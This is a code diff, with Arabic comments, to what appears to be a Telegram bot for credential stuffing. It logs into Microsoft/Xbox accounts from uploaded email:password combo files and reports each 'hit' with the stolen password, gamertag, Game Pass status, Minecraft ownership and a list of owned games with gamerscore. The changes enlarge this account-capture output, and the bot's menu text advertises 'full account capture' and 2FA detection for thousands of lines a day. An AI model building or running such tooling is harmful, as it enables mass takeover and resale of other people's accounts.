@@ -57,14 +57,12 @@ def extract_url_post(text):
 
 def fetch_xbox_extra_details(session, xb_token, uhs):
     """
-    دالة آمنة ومستقلة لجلب تفاصيل اشتراك الجيم باس وأبرز الألعاب المملوكة 
-    للحسابات الناجحة فقط، دون التأثير على سرعة الفحص الأساسي.
+    جلب تفاصيل اشتراك الجيم باس، القيم سكور لكل لعبة، وقائمة الألعاب بالتنسيق المطلوب
     """
     game_pass_status = "Not Active ❌"
-    owned_games = []
+    owned_games_formatted = []
     
     try:
-        # الحصول على XSTS Token الخاص بخدمات إكس بوكس لطلبات الحفظ والمكتبة
         xsts_xb_payload = {
             "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
             "RelyingParty": "http://xboxlive.com",
@@ -88,19 +86,38 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
                         game_pass_status = f"Active ✅ ({sub.get('name', 'Game Pass')})"
                         break
 
-            # 2. جلب الألعاب المملوكة (Inventory / Owned Titles)
-            inv_req = session.get("https://inventory.xboxlive.com/users/me/inventory", headers=headers, timeout=10)
-            if inv_req.status_code == 200:
-                inv_data = inv_req.json()
-                titles = inv_data.get("titles", [])
-                for t in titles[:10]:  # جلب أول 10 ألعاب لتجنب رسائل طويلة جداً
-                    g_name = t.get("name") or t.get("productTitle")
-                    if g_name and g_name not in owned_games:
-                        owned_games.append(g_name)
+            # 2. جلب الألعاب والـ Achievements المرتبطة باللاعب للحصول على الـ Score لكل لعبة
+            # نحتاج أولاً معرفة الـ XUID الخاص بالمستخدم
+            people_url = "https://peoplehub.xboxlive.com/users/me/people/social/summary"
+            people_resp = session.get(people_url, headers=headers, timeout=10)
+            xuid = None
+            if people_resp.status_code == 200:
+                p_data = people_resp.json()
+                if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
+                    xuid = p_data["profileUsers"][0].get("xuid")
+
+            if xuid:
+                ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/achievements"
+                ach_resp = session.get(ach_url, headers=headers, timeout=10)
+                if ach_resp.status_code == 200:
+                    ach_data = ach_resp.json()
+                    titles = ach_data.get("titles", [])
+                    game_counter = 1
+                    for title in titles:
+                        game_name = title.get("name", "Unknown Game")
+                        earned_gs = 0
+                        achievement_progress = title.get("achievement", {})
+                        if achievement_progress:
+                            earned_gs = achievement_progress.get("earnedGamerscore", 0)
+                        
+                        owned_games_formatted.append(f"{game_counter} - {game_name} | Score: {earned_gs}G")
+                        game_counter += 1
+                        if game_counter > 15:  # جلب أول 15 لعبة كحد أقصى لترتيب الرسالة
+                            break
     except Exception:
         pass
         
-    return game_pass_status, owned_games
+    return game_pass_status, owned_games_formatted
 
 def check_single_account(combo):
     parts = combo.split(':')
@@ -220,24 +237,20 @@ def check_single_account(combo):
         has_gp_basic = 'product_game_pass' in mc_ent_text
         has_mc = 'product_minecraft' in mc_ent_text
 
-        # جلب الألعاب التفصيلية واشتراك الجيم باس الدقيق للحساب الناجح فقط
+        # جلب التفاصيل الإضافية (Game Pass الدقيق + قائمة الألعاب مع الـ Score)
         detailed_gp, owned_games_list = fetch_xbox_extra_details(session, xb_token, uhs)
         
-        # إذا وجدنا جيم باس بالطريقة التفصيلية أو الأساسية نعتبره مفعل
-        final_gp = detailed_gp if "Active" in detailed_gp else ("Yes ✅" if has_gp_basic else "No ❌")
+        final_gp = detailed_gp if "Active" in detailed_gp else ("Active ✅" if has_gp_basic else "none")
 
         session.close()
 
-        games_str = "\n".join([f"  - {g}" for g in owned_games_list]) if owned_games_list else "  - No games found / Hidden"
+        games_str = "\n".join([f"{g}" for g in owned_games_list]) if owned_games_list else "- No games found / Hidden"
 
         hit_info = (
             f"📧 **Email:** `{email}`\n"
             f"🔑 **Password:** `{password}`\n"
-            f"🎮 **Gamertag:** {gamertag}\n"
-            f"🏆 **Gamerscore:** {gamerscore}\n"
-            f"⛏️ **Minecraft:** {'Yes' if has_mc else 'No'}\n"
-            f"🎮 **Game Pass:** {final_gp}\n"
-            f"📦 **Owned Games:**\n{games_str}\n"
+            f"Account: Gamertag: {gamertag} | Gamerscore: {gscore_int}G | GamePass: {final_gp} | Minecraft: {'YES' if has_mc else 'NO'}\n"
+            f"Games List:\n{games_str}\n"
             f"-----------------------------------"
         )
         
@@ -265,7 +278,7 @@ def send_welcome(message):
         "Your Status: 👤 Free (0/10000 lines today)\n\n"
         "Features:\n"
         "• Xbox Game Pass & Subscriptions\n"
-        "• Owned Games List\n"
+        "• Owned Games List with Gamerscore\n"
         "• Gamertag & Gamerscore\n"
         "• Minecraft Entitlements\n"
         "• Email Access & 2FA detection\n\n"
@@ -286,7 +299,7 @@ def callback_query(call):
             "Full account capture with Games & GamePass:\n"
             "• Minecraft Accounts\n"
             "• Xbox Game Pass Status\n"
-            "• Owned Games List\n"
+            "• Owned Games List & Score\n"
             "• Gamertag & Profile\n"
             "• 2FA detection\n\n"
             "Send your combo file in .txt format (Direct file upload)\n"
